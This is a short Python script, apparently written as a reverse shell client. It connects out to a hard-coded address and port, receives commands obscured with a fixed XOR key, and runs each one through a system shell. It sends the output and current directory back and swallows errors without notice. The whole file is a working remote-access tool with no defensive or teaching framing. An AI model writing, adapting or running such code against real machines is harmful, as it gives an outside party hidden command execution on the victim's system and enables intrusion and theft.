#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Python all
# made by  Xtr3am3r.0k@gmail.com
# need pycrypto https://www.dlitz.net/software/pycrypto/

import os
import subprocess
from socket import socket, AF_INET, SOCK_STREAM
from Crypto.Cipher import XOR





key = 'keyiskey'
myHOST = '192.168.44.128'
myPORT = 1111

def encrypter(cleardata):
    data = XOR.XORCipher(key)
    return data.encrypt(cleardata)

def decrypter(cleardata):
    data = XOR.XORCipher(key)
    return data.decrypt(cleardata)


def client():
    sockobj = socket(AF_INET, SOCK_STREAM)
    sockobj.connect((myHOST, myPORT))

    while True:
        output = ''
        data = (decrypter(sockobj.recv(1024))).decode('cp866')
        if data[:2] == 'cd':
            try:
                os.chdir(data[3:])
            except:
                output += 'enter cd error'

        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output = (cmd.stdout.read() + cmd.stderr.read()).decode('cp866')
            sockobj.send(encrypter(output + (os.getcwd() + '> ')))
    sockobj.close()

try:
    client()
except:
    print('Error')
